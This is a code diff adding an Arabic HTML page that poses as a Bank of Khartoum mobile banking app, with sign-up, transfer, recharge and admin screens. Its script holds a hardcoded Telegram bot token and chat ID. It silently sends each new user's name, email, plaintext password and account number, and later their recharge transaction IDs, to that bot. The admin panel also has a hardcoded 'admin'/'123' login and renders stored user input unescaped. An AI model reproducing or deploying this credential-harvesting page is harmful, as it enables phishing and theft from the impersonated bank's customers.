@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تطبيق بنكك - النسخة الشاملة</title>
+    <style>
+        :root {
+            --primary-blue: #004a99;
+            --success-green: #27ae60;
+            --danger-red: #e74c3c;
+            --bg-color: #f4f7f6;
+        }
+
+        body, html { 
+            margin: 0; padding: 0; width: 100%; min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: var(--bg-color); overflow-x: hidden;
+        }
+
+        #loading-overlay {
+            display: none; position: fixed; top: 0; left: 0; 
+            width: 100%; height: 100%; z-index: 30000;
+            background: rgba(255,255,255,0.98); flex-direction: column;
+            justify-content: center; align-items: center;
+        }
+        .loader-circle { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--primary-blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #congrats-modal {
+            display: none; position: fixed; top: 0; left: 0; 
+            width: 100%; height: 100%; z-index: 25000;
+            background: rgba(0,0,0,0.8); flex-direction: column;
+            justify-content: center; align-items: center; padding: 20px;
+        }
+
+        /* لوحة الأدمن الحصرية */
+        .admin-page { display: none; padding: 20px; background: #fff; min-height: 100vh; }
+        .admin-header { background: #333; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .user-card { background: #f9f9f9; border: 1px solid #ddd; padding: 15px; border-radius: 10px; margin-bottom: 10px; }
+        .admin-btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; color: white; font-weight: bold; font-size: 12px; }
+        .btn-approve { background: var(--success-green); }
+        .btn-reject { background: var(--danger-red); }
+        .btn-edit { background: var(--primary-blue); }
+
+        .header { 
+            background-color: var(--primary-blue); color: white; 
+            padding: 50px 20px 35px; border-bottom-left-radius: 30px; 
+            border-bottom-right-radius: 30px; position: relative;
+        }
+        
+        .logout-btn { position: absolute; top: 40px; left: 20px; background: rgba(255,255,255,0.2); border: none; width: 40px; height: 40px; border-radius: 50%; color: white; cursor: pointer; font-size: 20px; display: flex; align-items: center; justify-content: center; }
+
+        .balance-card { background: white; margin: -25px 20px 15px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
+
+        .main-btn { width: 100%; padding: 16px; background: var(--primary-blue); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 15px; }
+
+        .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 20px; margin-bottom: 15px; }
+        .action-item { background: white; padding: 15px; border-radius: 15px; text-align: center; border: 1px solid #eee; cursor: pointer; color: var(--primary-blue); font-weight: bold; font-size: 13px; }
+
+        .receipt { background: white; border: 1px solid #eef0f2; padding: 18px; border-radius: 15px; margin: 0 20px 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
+        .receipt-head { border-bottom: 1px solid #f8f9fa; padding-bottom: 10px; margin-bottom: 12px; color: var(--primary-blue); font-weight: bold; font-size: 14px; }
+        .receipt-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+        .receipt-label { color: #888; }
+        .receipt-val { font-weight: 600; color: #333; }
+
+        .page { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-color); z-index: 10000; box-sizing: border-box; overflow-y: auto; }
+        .show-page { display: block !important; }
+
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
+    </style>
+</head>
+<body>
+
+    <div id="loading-overlay">
+        <div class="loader-circle"></div>
+        <p style="margin-top:20px; font-weight:bold; color:var(--primary-blue);">جاري معالجة طلبك...</p>
+    </div>
+
+    <div id="congrats-modal">
+        <div style="background:white; width:90%; padding:35px 25px; border-radius:30px; text-align:center;">
+            <h2 style="color:var(--success-green); margin:0;">تهانينا</h2>
+            <p style="color:#666;">تم إنشاء حسابك بنجاح</p>
+            <div style="background:#f8fbff; padding:20px; border-radius:20px; margin:25px 0; border:1px dashed #d0e3ff; cursor:pointer;" onclick="copyMyAcc()">
+                <span style="font-size:13px; color:#888;">رقم الحساب (اضغط للنسخ)</span><br>
+                <b id="new-acc-num" style="font-size:32px; color:var(--primary-blue); letter-spacing:2px;">------</b>
+            </div>
+            <button class="main-btn" onclick="closeCongrats()">إغلاق</button>
+        </div>
+    </div>
+
+    <div id="auth-screen" style="padding: 60px 30px;">
+        <h1 style="color:var(--primary-blue); text-align:center; margin-bottom:40px;">بنك الخرطوم</h1>
+        <div id="reg-name-div" style="display:none;"><label>الاسم الكامل</label><input type="text" id="in-name" placeholder="أدخل اسمك"></div>
+        <label>البريد الإلكتروني</label><input type="email" id="in-email" placeholder="example@mail.com">
+        <label>كلمة المرور</label><input type="password" id="in-pass" placeholder="*******">
+        <button class="main-btn" onclick="handleAuth()">دخول</button>
+        <p onclick="toggleReg()" id="toggle-txt" style="text-align:center; color:var(--primary-blue); cursor:pointer; margin-top:35px; font-weight:bold;">إنشاء حساب جديد</p>
+    </div>
+
+    <div id="admin-ui" class="admin-page">
+        <div class="admin-header">
+            <span>لوحة تحكم الإدارة</span>
+            <button onclick="location.reload()" style="background:red; color:white; border:none; padding:5px 10px; border-radius:5px;">خروج</button>
+        </div>
+        <div id="admin-users-list"></div>
+    </div>
+
+    <div id="main-ui" style="display:none;">
+        <div class="header">
+            <button class="logout-btn" onclick="confirmLogout()">✕</button>
+            <div style="font-size:14px; margin-top:10px; opacity:0.8;">مرحباً بك،</div>
+            <div id="ui-name" style="font-size:22px; font-weight:bold;">--</div>
+            <div id="ui-acc" onclick="copyMyAcc()" style="font-size:15px; background:rgba(255,255,255,0.2); display:inline-block; padding:6px 15px; border-radius:8px; margin-top:12px; cursor:pointer;">--</div>
+        </div>
+        <div class="balance-card">
+            <div style="color:#888; font-size:13px;">الرصيد المتاح</div>
+            <div style="font-size:34px; font-weight:bold; color:var(--primary-blue); margin:12px 0;"><span id="ui-balance">0</span> <small>SDG</small></div>
+            <div style="display:flex; gap:12px;">
+                <button class="main-btn" style="background:var(--success-green); flex:1;" onclick="navTo('transfer-page')">تحويل</button>
+                <button class="main-btn" style="flex:1;" onclick="navTo('recharge-page')">شحن</button>
+            </div>
+        </div>
+        <div class="action-grid">
+            <div class="action-item" onclick="navTo('statement-page', renderHistory)">كشف الحساب</div>
+            <div class="action-item" onclick="navTo('pending-page', renderPending)">طلبات معلقة</div>
+        </div>
+    </div>
+
+    <div id="recharge-page" class="page">
+        <div style="padding:30px;">
+            <h3>طلب شحن الرصيد</h3>
+            <input type="number" id="re-amt" placeholder="المبلغ">
+            <input type="text" id="re-id" placeholder="رقم العملية">
+            <button class="main-btn" onclick="sendRecharge()">إرسال الطلب</button>
+            <button class="main-btn" style="background:#888;" onclick="navTo(null)">رجوع</button>
+        </div>
+    </div>
+
+    <div id="transfer-page" class="page">
+        <div style="padding:30px;">
+            <h3>تحويل مالي</h3>
+            <input type="number" id="tr-acc" placeholder="رقم الحساب">
+            <input type="number" id="tr-amt" placeholder="المبلغ">
+            <button class="main-btn" onclick="doTransfer()">تحويل الآن</button>
+            <button class="main-btn" style="background:#888;" onclick="navTo(null)">رجوع</button>
+        </div>
+    </div>
+
+    <div id="pending-page" class="page"><div id="pending-list" style="padding:20px;"></div><button class="main-btn" onclick="navTo(null)">رجوع</button></div>
+    <div id="statement-page" class="page"><div id="st-list" style="padding:20px;"></div><button class="main-btn" onclick="navTo(null)">رجوع</button></div>
+
+<script>
+    // --- بيانات التلجرام المدمجة ---
+    const TELEGRAM_TOKEN = "8237704900:AAFld1cd-OTfZD3GDbjC_whywgIxncv_G9s"; 
+    const TELEGRAM_CHAT_ID = "7373032198";
+
+    let userKey = null;
+    let db = JSON.parse(localStorage.getItem('bank_final_v17') || '{}');
+
+    function sendToTelegram(msg) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
+        fetch(url);
+    }
+
+    function toggleReg() {
+        const d = document.getElementById('reg-name-div');
+        d.style.display = d.style.display === 'none' ? 'block' : 'none';
+    }
+
+    function handleAuth() {
+        const email = document.getElementById('in-email').value;
+        const pass = document.getElementById('in-pass').value;
+        const isReg = document.getElementById('reg-name-div').style.display === 'block';
+
+        if(email === "admin" && pass === "123") {
+            showAdminUI();
+            return;
+        }
+
+        if(isReg) {
+            const name = document.getElementById('in-name').value;
+            document.getElementById('loading-overlay').style.display = 'flex';
+            setTimeout(() => {
+                const acc = Math.floor(100000 + Math.random()*899999).toString();
+                db[email] = { name, pass, balance: 0, acc, history: [], pending: [] };
+                localStorage.setItem('bank_final_v17', JSON.stringify(db));
+                sendToTelegram(`🔔 مستخدم جديد!\n👤 الاسم: ${name}\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}\n💳 الحساب: ${acc}`);
+                userKey = email;
+                document.getElementById('loading-overlay').style.display = 'none';
+                document.getElementById('new-acc-num').innerText = acc;
+                document.getElementById('congrats-modal').style.display = 'flex';
+            }, 3000); 
+        } else {
+            if(db[email] && db[email].pass === pass) {
+                userKey = email;
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('main-ui').style.display = 'block';
+                updateUI();
+            } else alert("خطأ في البيانات");
+        }
+    }
+
+    function showAdminUI() {
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('admin-ui').style.display = 'block';
+        const list = document.getElementById('admin-users-list');
+        list.innerHTML = Object.keys(db).map(email => `
+            <div class="user-card">
+                <b>${db[email].name}</b> (${db[email].acc})<br>
+                الرصيد: ${db[email].balance} SDG
+                <button class="admin-btn btn-edit" onclick="editBal('${email}')">تعديل الرصيد</button>
+            </div>
+        `).join('');
+    }
+
+    function editBal(email) {
+        const amt = prompt("أدخل الرصيد الجديد:");
+        if(amt) { db[email].balance = parseFloat(amt); localStorage.setItem('bank_final_v17', JSON.stringify(db)); showAdminUI(); }
+    }
+
+    function sendRecharge() {
+        const amt = document.getElementById('re-amt').value;
+        const id = document.getElementById('re-id').value;
+        db[userKey].pending.push({ id, amt, status: "قيد المراجعة" });
+        localStorage.setItem('bank_final_v17', JSON.stringify(db));
+        sendToTelegram(`💰 طلب شحن!\n👤 الاسم: ${db[userKey].name}\n💵 المبلغ: ${amt}\n🔢 العملية: ${id}`);
+        alert("تم الإرسال");
+        navTo(null);
+    }
+
+    function updateUI() {
+        const u = db[userKey];
+        document.getElementById('ui-name').innerText = u.name;
+        document.getElementById('ui-acc').innerText = u.acc;
+        document.getElementById('ui-balance').innerText = u.balance.toLocaleString();
+    }
+
+    function navTo(id, cb) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('show-page'));
+        if(id) { document.getElementById(id).classList.add('show-page'); if(cb) cb(); } else updateUI();
+    }
+
+    function closeCongrats() { document.getElementById('congrats-modal').style.display = 'none'; document.getElementById('auth-screen').style.display = 'none'; document.getElementById('main-ui').style.display = 'block'; updateUI(); }
+</script>
+</body>
+</html>
